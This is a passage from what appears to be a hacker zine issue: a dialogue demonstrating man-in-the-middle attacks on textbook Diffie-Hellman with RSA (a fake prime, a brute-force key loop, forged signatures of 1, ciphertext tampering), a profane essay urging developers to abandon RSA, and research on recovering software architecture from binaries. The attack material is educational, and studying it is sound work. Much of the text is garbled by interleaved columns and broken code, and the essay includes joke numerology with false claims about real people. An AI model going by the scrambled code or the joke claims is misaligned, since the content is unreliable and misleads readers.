>>> wire = ",".format(hexlify(iv).decode(’ascii’), hexlify(ct)
Alice
Carol
Bob
.decode(’ascii’))
RSA(k_Bob_pub, (ya, g, p))
Bob sends the IV and the ciphertext message 1f
f0 07 7f f9 9a a1 19 9b bc cc c3 3d db b5 52 28 84 4f
f8 8d d0 03 38 8d d6 68 81 17 73 39, ed dc cd dd d5
5f f0 0e ed d0 03 3b b8 89 9b bb b6 6a a8 8e ec c7
78 8a a0 0b b7 79 9d d3 33 32 22 27 7e ed de e9 9e
ed de e6 67 7d d1 12 29 94 44 49 96 6f f5 58 8d df
fe e4 4c c6 62 2c cd dd d5 52 24 4d d7 79 91 17 7e
e5 5e e8 89 9e e3 32 2f f6 6e e6 6e e6 62 26 65. In
summary, this is what happened so far:
RSA(k_Bob_pub, (1, g, p))
RSA decrypt
with (ya = 1, g, p)
using openssl.backend to
compute ZZb . . .
raise ValueError
“Now you must behave, Carol. We will no longer
accept your MitMed values. Now that we prohibit
the two bad DH values and everything is encrypted,
we are 100
Alice
Carol
Bob
RSA(k_Bob_pub, (ya, g, p))
Run 3: RSA-Encrypted textbook DH
using parts of the OpenSSL library and
custom Primes
RSA(k_Bob_pub, (yc, g, pc))
RSA decrypt
using openssl.backend
ZZb = pow(yc, xb, pc)
Alice and Bob try the handshake again. Carol can-
not send ya = 1 because Bob will detect it and abort
the handshake. Alice sends 09a4b88232b16136...
[504 bytes omitted]. But Carol knows the math. She
chooses a specially-crafted ‘prime’ pc and computes
a random, valid yc value.
RSA(k_Alice_pub, yb)
RSA(k_Alice_pub, garbage)
ciphertext =
Enc(ZZb , message)
RSA decrypt
ZZa = garbage 2
ciphertext
>>> pc = pow(2, 1536) - 1
Carol chose a great “prime” pc = 2 1536 −1 and knows
the key is broken: Only one bit is set! She can just
brute force all possible keys, the one that decrypts
the ciphertext to printable ASCII text is most likely
the correct key.
>>> xc = int.from_bytes(os.urandom(192), byteorder=’big’)
>>> yc = pow(g, xc, pc)
Well, pc isn’t actually a prime. Let’s see if
OpenSSL accepts it as prime. Reliably testing
for primality is expensive, 37 chances are good that
the prime gets waved through. Carol forwards
2f5bed0189fac5f0... [504 bytes omitted]. After
RSA decryption, Bob’s code with the OpenSSL
backend happily accepts all values. Bob sends
a790fd65fb6c163e... [504 bytes omitted]. Alice still
thinks that the RFC 3526 prime is used. Carol just
forwards random plausible values to Alice, but she
won’t be able to MitM this key. Carol forwards
a7cd7cf2c5065833... [504 bytes omitted]. The DH
key exchange is completed successfully. Now Bob
can use the key ZZ b established with DH to send an
encrypted message to Alice.
>>> iv, ct = map(unhexlify, wire.split(’,’))
>>> for i in range(1536):
... keyguess = pow(2, i)
... msg = aes128_ctr(iv, kdf128(keyguess.to_bytes(192,
byteorder=’big’)), ct)
...
...
try:
if not all(c in string.printable for c in
msg.decode(’ascii’)):
...
...
...
...
continue
except UnicodeDecodeError:
#not ASCII
continue
break
37 Common primality tests are probabilistic and relatively fast, but can err. Deterministic primality tests in polynomial time
exist. Note that DH does not need an arbitrary prime and some g, but the generator should generate a not-too-small TM
subgroup.
65The brute-forced key is
Again, Bob is right about ignoring the compat-
ibility parameters. However, Carol smiles as Bob
completely ignored Alice’s comment about padding.
“Let’s hardcode the prime p and generator g
for simplicity and switch back to the trivial non-
OpenSSL implementation.” Alice suggests and ev-
erybody agrees. This simplifies the DH exchange as
now, only y and the signature of y will be exchanged.
Alice only sends the following in the first step:
79,792,922,228,281,816,162,
625,251,514,142,426,264,643,433,337,375,759,593,935,354,543,
439,395,950,503,033,336 ,
or in hex
\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
>>> ",".format(ya, RSA_sign(k_Alice_priv, ya))
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
Alice sends 45e59717fd2ad3aa...[184 bytes of y
omitted],5ee95099ea63afc6...[504 bytes of signature
omitted]. Carol just forwards 1,1. Bob parses the
values, verifies the signature correctly and performs
his step of the DH exchange.
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00
(exactly one bit set). Carol is
correct. She immediately shouts out the message
“Hey Alice! See, this is perfectly secure now.” Bob is
depressed. “Why doesn’t my code work?”, he asks.
“Probably DH is not strong enough and we need
to use elliptic curve DH?”, he conjectures. “Maybe
Carol even has a quantum computer hidden in her
pocket, let me find a post-quantum replacement for
Diffie-Hellman, ...” he continues. Carol interferes,
“The same ideas of my attack also apply to ECDH
or a post-quantum drop-in replacement with the
same properties. Don’t waste your time on this line
of thought. If you cannot use textbook DH, ECDH
(or the post-quantum candidates) won’t help.”
>>> ya, signature = map(int, wire.split(’,’))
\x00\x00\x00\x00\x00\x00
>>> if not RSA_verify(k_Alice_pub, ya, signature):
>>> print("Signature verification failed")
>>> return ’reject’
[...]
>>> return ",".format(yb, RSA_sign(k_Bob_priv, yb))
Bob sends f543932fd7646f7e...[184 bytes of y
omitted],8a3c8e3aac04e59d...[504 bytes of signature
omitted]. Carol just forwards 1,1. Alice smiles as
she receives the values. Nevertheless, she performs
the signature verification professionally. Both the
signature check at Bob and the signature check at
Alice were successful and Alice and Bob agreed on
a shared key. This is what happened so far, where
RSA corresponds to RSA_sign as defined above:
Run 4: Textbook DH signed with text-
book RSA
Alice
Alice tries to put Bob on the right track, “Maybe
RSA encryption does not help, but can we use RSA
differently? Remember, encryption itself does not
not provide integrity.” “Of course,” Bob replies, “we
need to sign the DH values. And signing with RSA
is just encryption with the private key.” “Don’t for-
get the padding,” Alice is trying to help, but Bob
immediately codes:
Carol
Bob
ya, RSA(k_Alice_priv, ya)
1, 1
RSA_verify(k_Alice_pub, 1, 1)
ZZb = pow(1, xb, p)
yb, RSA(k_Bob_priv, yb)
1, 1
RSA_verify(k_Bob_pub, 1, 1)
ZZa = pow(1, xa, p)
>>> import Crypto.PublicKey.RSA
>>> def RSA_sign(k_priv, msg):
... # ignore the compatibility parameters
... return k_priv.sign(msg, None)[0]
Carol exclaims “The key is 1!” Bob is all lost, “How
could this happen again? I checked the signature!”
“Indeed,” Carol explains, “but you should have lis-
tened to Alice’s remark about the padding. RSA
signatures are not just the textbook RSA opera-
tion with the private key. Plain textbook RSA is
>>> def RSA_verify(k_pub, msg, signature):
... # ignore the compatibility parameters
... return k_pub.verify(msg, (signature, None))
66just msg d mod N , where d is private. Guess how I
could forge a valid RSA private key operation with-
out knowledge of d if I may choose msg freely?” Bob
looks desperate. “Can Carol break RSA? What is
the magic math behind her attack?”, he wonders.
Carol helps, “1 d mod N = 1, for any d. Of course I
did not break RSA. The way you tried to use RSA
as a signature scheme is just not existentially un-
forgeable. Paddings, or signature schemes, exist for
a reason.” By the way, the RSA encryption without
padding used in the previous runs is also danger-
ous. 38
omitted]. Carol forwards the message unmodified.
Finally, Alice and Bob established a shared key and
Carol does not know it.
Alice
Carol
Bob
ya, RSA(k_Alice_priv, ya)
ya, RSA(k_Alice_priv, ya)
RSA_verify(k_Alice_pub, . . .)
ZZb = pow(ya, xb, p)
yb, RSA(k_Bob_priv, yb)
yb, RSA(k_Bob_priv, yb)
Run 5: Textbook DH signed with
RSASSA-PSS
RSA_verify(k_Bob_pub, . . .)
ZZa = pow(yb, xa, p)
To complete the scenario, Bob uses the freshly es-
tablished key to send an encrypted message to Alice.
Bob replaces the sign and verify functions:
>>> from cryptography.hazmat.primitives import hashes
>>> iv = os.urandom(16)
>>> from cryptography.hazmat.primitives.asymmetric import
padding >>> aeskey = kdf128(ZZ_b) # squash the key to 128 bit
>>> def RSA_sign(k_priv, msg): >>> ct = aes128_ctr(iv, aeskey, b’Hey Alice!
>>> return k_priv.sign( perfectly secure now.’)
... msg, >>> wire = ",".format(hexlify(iv).decode(’ascii’), hexlify(ct)
... padding.PSS( .decode(’ascii’)
...
mgf=padding.MGF1(hashes.SHA256()),
...
Bob sends the IV and the ciphertext message 6e
e1 1c c4 48 8a ad da ad d9 97 77 7c c8 86 6a aa a4 4e
e0 0b b3 38 86 65 5f fc c9 99 90 0e, 3a a4 48 82 2f f5
5f fb b0 0b b7 7d d8 83 36 6a a8 8c c0 02 21 1f fc c7
75 59 91 1e e6 67 77 7f f4 48 83 38 86 6e ec cd d8 8c
c3 31 1a ab bc c3 3d d5 5e e2 25 52 21 13 3e e3 34 4c
c4 4d da a5 59 94 48 89 99 96 62 29 9a a2 26 66 60
01 1c cf fc cf fc c4 4e ed d4 45 51. Carol remembers
the plaintext Bob sent in run 3. She realizes that
this run’s ciphertext has exactly the same length as
the plaintext in run 3. Carol forwards a ciphertext
which is slightly shorter: 6e e1 1c c4 48 8a ad da ad
d9 97 77 7c c8 86 6a aa a4 4e e0 0b b3 38 86 65 5f fc
c9 99 90 0e, 37 74 43 33 35 50 0d d8 88 8a ab bc c5
53 3c ca a2 28 8f f2 21 1c c6 66 63 3d d4 4a a4 43 38
8f f4 4c cb ba a6 6f f1 18 8c cc cf f0 0e ee ee e2 24
44 4f f2 2e e6 69. Alice reads out loud the message
she received and decrypted: “Encryption is not In-
tegrity.” Bob shouts, “This is not the message! How
can this happen? Did Carol break AES-CTR?” Al-
ice and Carol answer simultaneously, “AES-CTR is
secure encryption, but Encryption is not Integrity.”
salt_length=padding.PSS.MAX_LENGTH
...
),
...
...
hashes.SHA256()
)
The RSA_verify function is replaced accord-
ingly.
Now Alice and Bob can try their handshake
again. Alice sends 9403c79416ebcedb...[184 bytes
of y omitted],2043516ccf286cb4...[504 bytes of signa-
ture omitted]. Carol forwards the message unmod-
ified. Bob looks at Carol suspiciously. “I cannot
modify this without breaking the signature,” Carol
replies. “Probably the DH prime is a bit too small
for the future; Logjam predicts 1024-bit breakage.
Maybe you could use fresh DH values for each ex-
change or switch to ECDH to be ready for the future,
... But I’m out of ideas for attack I could carry out
on my slow laptop against your handshake for now.”
Carol concludes.
Bob sends c02a4deacd839b93...[184 bytes of y
omitted],642f187cf7ca041b...[504 bytes of signature
38 Use
See, this is
OAEP!
6720:09
RSA GTFO
by Ben Perez
What is RSA again?
I’d like to start off by saying: “Fuck RSA.” Fuck
the company RSA, fuck the conference, and fuck
these things:
RSA is a public-key cryptosystem that has two pri-
mary use cases. The first is public key encryption,
which lets a user, Alice, publish a public key that al-
lows anyone to send her an encrypted message. The
second use case is digital signatures, which allow Al-
ice to “sign” a message so that anyone can verify the
message hasn’t been tampered with. The convenient
thing about RSA is that the signing algorithm is ba-
sically just the encryption algorithm run in reverse.
Therefore for the rest of this post we’ll often refer
to both as just RSA.
To set up RSA, Alice needs to choose two primes
p and q that will generate the group of integers
modulo N = pq. She then needs to choose a pub-
lic exponent e and private exponent d such that
ed = 1mod (p − 1)(q − 1). Basically, e and d need
to be inverses of each other.
Once these parameters have been chosen, an-
other user, Bob, can send Alice a message M
Alice can
by computing C = M e (mod N ).
then decrypt the ciphertext by computing M =
C d (mod N ). Conversely, if Alice wants to sign a
message M , she computes S = M d (mod N ), which
any user can verify was signed by her by checking
M = S e (mod N ).
That’s the basic idea. We’ll get to padding–
essential for both use cases–in a bit, but first let’s
see why, during every step of this process, things can
go catastrophically wrong.
To properly motivate why I have these feelings
about RSA, I’m going to have to introduce some
mathematical foundations. RSA was invented as a
result of a night of drinking “liberal quantities of
Manischewitz wine” 39 in 1977, which was the same
year Elvis died. If you encode “Rivest,” “Shamir,”
“Adelman,” and “Elvis” using the Chaldean numerol-
ogy system and take their sum,
Rivest
21
Shamir
16
Adelman
23
Elvis
18
78
the result is 78. Adding the proper RSA key size
in 2019, and subtracting the number of days Barack
Obama was president,
78 + 4096 − 2920,
we arrive at 1254, the year in which the Catholic
church created the dogma surrounding purgatory.
Finally, divide this value by the number of felonies
to which Jeffrey Epstein pled guilty before he was
murdered, and add Buzz Aldrin’s age when he faked
the moon landing:
1254 ÷ 2 + 39 = 666.
That’s right: Mathematical proof that RSA is the
devil’s work.

But if pure logic won’t convince you, perhaps we
could take a look at how RSA actually works.
39 The RSA Cryptosystem:
historyofrsa.pdf
History, Algorithm, Primes, 2007, by Michael Calderbank.
68
unzip pocorgtfo20.pdfmon, and research has shown that roughly one per-
cent of TLS traffic in 2012 was susceptible to such
an attack. 40 Moreover, p and q must be chosen in-
dependently. If p and q share approximately half of
their upper bits, then N can be factored using Fer-
mat’s factorization method. In fact, even the choice
of primality testing algorithm can have security im-
plications. 41
Perhaps the most widely-publicized prime selec-
tion attack is the ROCA vulnerability in RSALib
which affected many smartcards, trusted platform
modules, and even Yubikeys. Here, key generation
only used primes of a specific form to speed up com-
putation time. Primes generated this way are trivial
to detect using clever number theory tricks. Once a
weak system has been recognized, the special alge-
braic properties of the primes allow an attacker to
use Coppersmith’s method to factor N . More con-
cretely, that means if the person sitting next to me
at work uses a smartcard granting them access to
private documents, and they leave it on their desk
during lunch, I can clone the smartcard and give
myself access to all their sensitive files.
It’s important to recognize that in none of these
cases is it intuitively obvious that generating primes
in such a way leads to complete system failure. Re-
ally subtle number-theoretic properties of primes
have a substantial effect on the security of RSA. To
expect the average developer to navigate this mathe-
matical minefield severely undermines RSA’s safety.
Devs Talking About Their
Custom RSA Implementation
Their RSA Implementation
Setting Yourself Up for Failure
RSA requires developers to choose quite a few pa-
rameters during setup. Unfortunately, seemingly in-
nocent parameter-selection methods degrade secu-
rity in subtle ways. Let’s walk through each param-
eter choice and see what nasty surprises await those
who choose poorly.
Prime Selection
Private Exponent
RSA’s security is based off the fact that, given a
(large) number N that’s the product of two primes
p and q, factoring N is hard for people who don’t
know p and q. Developers are responsible for choos-
ing the primes that make up the RSA modulus. This
process is extremely slow compared to key genera-
tion for other cryptographic protocols, where simply
choosing some random bytes is sufficient. Therefore,
instead of generating a truly random prime number,
developers often attempt to generate one of a spe-
cific form. This almost always ends badly.
There are many ways to choose primes in such a
way that factoring N is easy. For example, p and q
must be globally unique. If p or q ever gets reused
in another RSA moduli, then both can be easily fac-
tored using the GCD algorithm. Bad random num-
ber generators make this scenario somewhat com-
Since using a large private key negatively affects de-
cryption and signing time, developers have an incen-
tive to choose a small private exponent d, especially
in low-power settings like smartcards. However, it
is possible for an attacker to recover the private key
when d is less than the 4 th root of N . Instead, devel-
opers are encouraged to choose a large d such that
Chinese remainder theorem techniques can be used
to speed up decryption. However, this approach’s
complexity increases the probability of subtle imple-
mentation errors, which can lead to key recovery. In
fact, last Summer Aditi Gupta modeled this class
of vulnerabilities with the symbolic execution tool
Manticore. 42
People might call me out here and point out that
normally when setting up RSA you first generate a
40 unzip
pocorgtfo20.pdf weakkeys12.pdf
pocorgtfo20.pdf primeandprejudice.pdf
42 https://blog.trailofbits.com/2018/08/14/fault-analysis-on-rsa-signing/
41 unzip
69modulus, use a fixed public exponent, and then solve
for the private exponent. This prevents low private
exponent attacks because if you always use one of
the recommended public exponents (discussed in the
next section) then you’ll never wind up with a small
private exponent. Unfortunately this assumes de-
velopers actually do that. In circumstances where
people implement their own RSA, all bets are off
in terms of using standard RSA setup procedures,
and developers will frequently do strange things like
choose the private exponent first and then solve for
the public exponent.
libraries use a small public exponent and omit a sim-
ple padding verification check when processing RSA
signatures. Bleichenbacher’s signature forgery at-
tack is so simple that it is a commonly used exercise
in cryptography courses. 44
Parameter Selection is Hard
The common denominator in all of these parame-
ter attacks is that the domain of possible parameter
choices is much larger than that of secure param-
eter choices. Developers are expected to navigate
this fraught selection process on their own, since
all but the public exponent must be generated pri-
vately. There are no easy ways to check that the
parameters are secure; instead developers need a
depth of mathematical knowledge that shouldn’t be
expected of non-cryptographers. While using RSA
with padding may save you in the presence of bad
parameters, many people still choose to use broken
padding or no padding at all.
Public Exponent
Just as in the private exponent case, implementers
want to use small public exponents to save on en-
cryption and verification time. It is common to use
Fermat primes in this context, in particular e = 3,
17, and 65537. Despite cryptographers recommend-
ing the use of 65537, developers often choose e = 3
which introduces many vulnerabilities into the RSA
cryptosystem.
When e = 3, or a similarly small number, many
things can go wrong. Low public exponents often
combine with other common mistakes to either allow
an attacker to decrypt specific ciphertexts or factor
N . For instance, the Franklin-Reiter attack allows
a malicious party to decrypt two messages that are
related by a known, fixed distance. In other words,
suppose Alice only sends “chocolate” or “vanilla” to
Bob. These messages will be related by a known
value and allow an attacker Eve to determine which
are “chocolate” and which are “vanilla.” Some low
public exponent attacks even lead to key recovery.
If the public exponent is small (not just 3), an at-
tacker who knows several bits of the secret key can
recover the remaining bits and break the cryptosys-
tem. While many of these e = 3 attacks on RSA en-
cryption are mitigated by padding, developers who
implement their own RSA fail to use padding at an
alarmingly high rate.
RSA signatures are equally brittle in the pres-
ence of low public exponents. In 2006, Bleichen-
bacher found an attack which allows attackers to
forge arbitrary signatures in many RSA implemen-
tations, including the ones used by Firefox and
Chrome. 43 This means that any TLS certificate
from a vulnerable implementation could be forged.
This attack takes advantage of the fact that many
Padding Oracle Attacks, Everywhere
As we mentioned above, just using RSA out of the
box doesn’t quite work. For example, the RSA
scheme laid out in the introduction would produce
identical ciphertexts if the same plaintext were ever
encrypted more than once. This is a problem, be-
cause it would allow an adversary to infer the con-
tents of the message from context without being able
to decrypt it. This is why we need to pad messages
with some random bytes. Unfortunately, the most
widely used padding scheme, PKCS #1 v1.5, is of-
ten vulnerable to something called a padding oracle
attack.
Padding oracles are pretty complex, but the
high-level idea is that adding padding to a mes-
sage requires the recipient to perform an additional
check: whether the message is properly padded.
When the check fails, the server throws an invalid
padding error. That single piece of information is
enough to slowly decrypt a chosen message. The
process is tedious and involves manipulating the
target ciphertext millions of times to isolate the
changes which result in valid padding. But that one
error message is all you need to eventually decrypt a
chosen ciphertext. These vulnerabilities are particu-
larly bad because attackers can use them to recover
43 https://www.imperialviolet.org/2014/09/26/pkcs1.html
44 https://cryptopals.com/sets/6/challenges/42
70pre-master secrets for TLS sessions. For more de-
tails on the attack, there is an excellent explainer
on StackExchange. 45
The original attack on PKCS #1 v1.5 was dis-
covered way back in 1998 by Daniel Bleichenbacher.
Despite being over 20 years old, this attack contin-
ues to plague many real-world systems today. Mod-
ern versions of this attack often involve a padding
oracle slightly more complex than the one originally
described by Bleichenbacher, such as server response
time or performing some sort of protocol downgrade
in TLS. One particularly shocking example was the
ROBOT attack, which was so bad that a team of
researchers were able to sign messages with Face-
book’s and PayPal’s secret keys. Some might argue
that this isn’t actually RSA’s fault—the underlying
math is fine, people just messed up an important
standard several decades ago. The thing is, we’ve
had a standardized padding scheme with a rigorous
security proof, OAEP, since 1998. But almost no
one uses it. Even when they do, OAEP is notori-
ously difficult to implement and often is vulnerable
to Manger’s attack, which is another padding oracle
attack that can be used to recover plaintext.
The fundamental issue here is that padding is
necessary when using RSA, and this added com-
plexity opens the cryptosystem up to a large attack
surface. The fact that a single bit of information,
whether the message was padded correctly, can have
such a large impact on security makes developing se-
cure libraries almost impossible. TLS 1.3 no longer
supports RSA so we can expect to see fewer of these
attacks going forward, but as long as developers con-
tinue to use RSA in their own applications there will
be padding oracle attacks.
Using
Secure
Crypto
Libraries
Rolling
Your
Own
RSA
r s
De v elop e
So what should you use instead
People often prefer using RSA because they believe
it’s conceptually simpler than the somewhat con-
fusing DSA protocol or moon math elliptic curve
cryptography (ECC). But while it may be easier to
understand RSA intuitively, it lacks the misuse re-
sistance of these other more complex systems.
First of all, a common misconception is that
ECC is super dangerous because choosing a bad
curve can totally sink you. While it is true that
curve choice has a major impact on security, one
benefit of using ECC is that parameter selection
can be done publicly. Cryptographers make all the
difficult parameter choices so that developers just
need to generate random bytes of data to use as keys
and nonces. Developers could theoretically build an
ECC implementation with terrible parameters and
fail to check for things like invalid curve points, but
they tend to not do this. A likely explanation is
that the math behind ECC is so complicated that
very few people feel confident enough to actually
implement it. In other words, it intimidates peo-
ple into using libraries built by cryptographers who
know what they’re doing. RSA on the other hand
is so simple that it can be (poorly) implemented in
an hour.
Second, any Diffie-Hellman based key agreement
or signature scheme (including elliptic curve vari-
ants) does not require padding and therefore com-
pletely sidesteps padding oracle attacks. This is a
45 https://crypto.stackexchange.com/questions/12688/can-you-explain-bleichenbachers-cca-attack-on-pkcs1-v1-5
71major win considering RSA has had a very poor
track record avoiding this class of vulnerabilities.
We recommend using Curve25519 for key ex-
change and digital signatures. Encryption needs to
be done using a protocol called ECIES which com-
bines an elliptic curve key exchange with a symmet-
ric encryption algorithm. Curve25519 was designed
to entirely prevent some of the things that can go
wrong with other curves, and is very performant.
Even better, it is implemented in libsodium, which
has easy-to-read documentation and is available for
most languages.
Seriously, stop using RSA
RSA was an important milestone in the development
of secure communications, but the last two decades
of cryptographic research have rendered it obsolete.
Elliptic curve algorithms for both key exchange and
digital signatures were standardized back in 2005
and have since been integrated into intuitive and
misuse-resistant libraries like libsodium. The fact
that RSA is still in widespread use today indicates
both a failure on the part of cryptographers for not
adequately articulating the risks inherent in RSA,
and also on the part of developers for overestimat-
ing their ability to deploy it successfully.
The security community needs to start thinking
about this as a herd-immunity problem—while some
of us might be able to navigate the extraordinar-
ily dangerous process of setting up or implement-
ing RSA, the exceptions signal to developers that it
is in some way still advisable to use RSA. Despite
the many caveats and warnings on StackExchange
and Github READMEs, very few people believe that
they are the ones who will mess up RSA, and so they
proceed with reckless abandon. Ultimately, users
will pay for this. This is why we all need to agree
that it is flat out unacceptable to use RSA in 2019.
No exceptions.
Fuck RSA.
7220:10
A Code Pirate’s Cutlass:
Recovering Software Architecture from Embedded Binaries
by evm
He looks around, around
He sees angels in the architecture
Spinning in infinity
He says Amen! and Hallelujah!
- Paul Simon, “You Can Call Me Al”
(which was probably not written
about software RE)
Software RE underlies much of the work in the
cyber landscape for both defensive and offensive op-
erations.
When developing complex programs, it is com-
mon to segment functionality of code into multiple
source files. These source files are compiled into
multiple object files and then linked into an exe-
cutable program. The object files contain pieces of
information (such as the developer-given names of
functions and global data structures) that the linker
uses to determine relationships between them. Once
the linker produces the final executable, all the in-
termediate developer-generated information is gone
(unless for some reason debugging information is in-
cluded, which rarely happens in production code).
See Figure 1 for an illustration of this process.
This means that software reverse engineers ap-
proaching a new target are usually dealing with a
fully linked binary with no symbols included. How-
ever, we know that the binary is just a conglomera-
tion of the original object files, usually in the exact
order they were passed to the linker. Usually soft-
ware reverse engineers are interested in a specific
cross section of the binary associated with either a
particular high-level function (“how does this pro-
gram handle network authentication?”) or whether
vulnerable points in the code can be reached from a
particular entry point. Often software reverse engi-
neers use different clues to find either the function-
ality they are interested in or the areas they think
might be vulnerable. Eventually after many hours
of the analyst’s time, the structure and design of the
code may become apparent. What if the structure
and design of code could be extracted in an auto-
mated way? How much faster and more effective
could we make RE if we were able to work from the
beginning by analyzing the design of the program
instead of starting from a sea of subroutines?
Defining the Metric
The concept is pretty simple. Local function affinity
(LFA) is like a force vector, showing which direction
a subroutine is pulled toward based on its relation-
ship to nearby subroutines. Consider your average
C source code file - and ignore external function calls
for the moment. As you move from the beginning of
the file down to the bottom, calls start in the pos-
itive direction (down) and eventually switch to the
negative direction (up). The idea is that when we
look at the binary, we should be able to detect the
switch from the negative direction back to positive
at the beginning of the next object file.
73Figure 1. Illustration of compilation, linking, and what this research is attempting to produce. Note: This
is greatly oversimplified (e.g., the standard library often consists of hundreds of object files).
no LFA score (meaning it either has no references, or
all references are above the external threshold), my
current implementation treats it like it isn’t there.
This creates gaps between object files.
So how do we deal with external calls? For now,
LFA just discards any function calls over a fixed
threshold, which currently has been set at 4 KB.
Admittedly this isn’t a great way to do it, and later
I’ll talk about some ways this might be improved.
We need to combine both outgoing function ref-
erences (calls FROM this function to other func-
tions) and incoming function references (calls TO
this function from other functions) to include helper
functions that don’t make calls. Even with the ex-
ternal calls “eliminated,” we want to weight our met-
ric toward nearby neighbors. So we define the metric
this way:
Extracting Software Architecture
Once approximate object file boundaries are ex-
tracted, we can produce a software architecture pic-
ture by generating a directed graph where each ob-
ject is a node, and edges between nodes represent
calls from any function in the first object to any
function in the second object.
where neighbors(f) is defined as the set of func-
tions (i.e., their address in the memory map) that
call f or are called by f for which the distance from
f to the function is below a chosen threshold. Mul-
tiple references are counted.
For practical purposes, in my current implemen-
tation of LFA, I treat the outgoing and incoming
references as separate scores, and if either is zero, I
interpolate a new score based on the previous score.
This helps to smooth out the data.
With the object file boundaries approximately
identified, we can also make use of debugging string
information in the binary. The current LFA imple-
mentation looks at possible source file names as well
as common words, bigrams and trigrams in order to
guess a possible name for the object.
Figure 2 shows an example software architecture
diagram automatically extracted from a target bi-
nary using LFA. Some interesting features are read-
ily apparent in this graph, which are not readily dis-
cernible by other means. It is readily apparent which
objects are most commonly referenced in the tar-
get program (e.g. sys_up_config and unk_mod_5).
Notice also how unknown modules 1-6 form a sub-
graph that is only reachable from sys_up_config.
This indicates that these objects are only used by
sys_up_config and not directly called by any other
object. This means they are essentially a library de-
pendency for sys_up_config and can be safely ig-
nored by the RE analyst (unless the functionality of
sys_up_config is of interest).
Detecting Object Boundaries
For now, LFA has a simple edge-detection metric,
which is simply a change from negative values (two
of three previous values are negative) to a positive
value where the difference is greater than 2. Dur-
ing initial research, a colleague suggested a simple
metric like this due to the irregularity of the signal
(i.e., due the varying sizes of object files). This edge-
detection strategy can most certainly be improved
upon (which will be discussed later).
I should also note here that when a function has
74Figure 2. Automated software architecture graph produced by LFA, with objects/modules named by source
file string references.
Measuring Success
cess, whenever there are gaps between modules in
the algorithm’s list, we add these to the “gap area”
count. We assume that the ground truth .map file
is contiguous.
Once the maps are reconciled, for each module in
the algorithm’s map, we score the area that matches
the ground truth map and also score the “underlap”
(areas of the ground truth module not covered by
the algorithm’s module). The final score is then a
combined result of match, gap, and underlap per-
centages for the binary. A perfect score would be a
100% match, with no gaps or underlaps. See Table 3
for a list of results to date.
As far as I can tell (and dear reader, I would humbly
welcome your education on this subject if you have
further information), measuring success in solving
this problem is somewhat unusual and difficult for
a couple of reasons. We want to credit the algo-
rithm with success when it identifies smaller groups
of functionality within an original source file. For
instance, if a very large source file contains three
groups of related functions, we want to give the al-
gorithm credit if it identifies these three groups as
separate objects. We also want to give credit when
the algorithm defines two adjacent, closely related
objects as a single thing.
LFA outputs a .map file, which is compared
against the .map file produced by the compiler dur-
ing the build (the ground truth). First we define
a process of reconciliation, where we combine mod-
ules (objects) in the ground truth file and in the
algorithm’s .map file, to produce the best alignment
possible between the maps. To do this we start
with the first module in both maps. We combine
whichever module is shorter with subsequent mod-
ules in that map to produce the best alignment with
the module from the other map. During this pro-
75Name/operating system (architecture)
Gnuchess (x86)
PX4 Firmware/Nuttx (ARM)
GoodFET41 Firmware (msp430)
Tmote Sky Firmware/Contiki (msp430)
NXP HTTPD Demo/FreeRTOS (ARM)
Match, %
76.1
82.2
76.1
93.3
86.7
Gap, %
3.2
13.6
0.0
0.0
1.4
Underlap, %
20.7
4.2
23.9
6.7
11.9
Figure 3. LFA results to date. The algorithm has a high gap score on the PX4 firmware due to a few very
large functions that generate no LFA score.
A Max Cut Graph-Based Algorithm
Many graph algorithms that deal with segmentation
are encumbered by the fact that nodes exist in two
or three dimensions, meaning that there are facto-
rial possibilities for “cuts” in the graph. Not so for
a binary. Although the graph representation may
be complicated, a binary is a one-dimensional struc-
ture, a number line. Using this to my advantage I
developed an algorithm which segments the binary
by cutting it into two pieces, then recursively cut-
ting those pieces until a threshold is reached. In the
binary the possible “cuts” are between the end of one
function and the beginning of the next (one possible
cut for every function in the binary). These possible
cuts are scored by scoring the average of the call dis-
tances for all calls that metaphorically “pass over”
the cut address. The higher the average call score,
the less likely the two functions on either side of the
cut are to be part of the same object (since short
range inter-object calls would lower the score).
Pseudocode of the maximum cut object segmen-
tation algorithm is shown in Figure 4.
The algorithm runs in O(n log n) for speed, and
O(n 2 ) for memory usage, although memory usage
could be reduced if old copies of the graph could
be freed. From limited evaluation, MaxCut seems
to work at least as well as LFA in most cases, see
results in Table 5.
46 Jin, Wesley, et al. “Recovering c++ objects from binaries using inter-procedural data-flow analysis.” Proceedings of ACM
SIGPLAN on Program Protection and Reverse Engineering Workshop 2014. ACM, 2014.
47 Yoo, Kyungjin, and Rajeev Barua. “Recovery of Object Oriented Features from C++ Binaries.” APSEC (1). 2014.
762
4
6
8
10
12
14
f u n c t i o n make_cut ( s t a r t , end , graph ) :
f o r node i n graph . nodes :
c u t _ a d d r e s s = node . a d d r e s s − 1
weight [ cut_address ] = 0
edge_count = 0
f o r edge i n graph . e d g e s :
i f edge c r o s s e s c u t _ a d d r e s s :
w e i g h t [ c u t _ a d d r e s s ] += edge . l e n g t h
edge_count +=1
i f edge_count == 0 :
return c u t _ a d d r e s s
else :
w e i g h t [ c u t _ a d d r e s s ] = w e i g h t [ c u t _ a d d r e s s ] / edge_count
return a d d r e s s with maximum w e i g h t
16 f u n c t i o n d o _ c u t t i n g ( s t a r t , end , graph ) :
i f ( end − s t a r t > THRESHOLD) and graph . nodes > 1 :
18
c u t _ a d d r e s s = make_cut ( s t a r t , end , graph )
d o _ c u t t i n g ( s t a r t , cut_address , subgraph ( graph , s t a r t , c u t _ a d d r e s s ) )
20
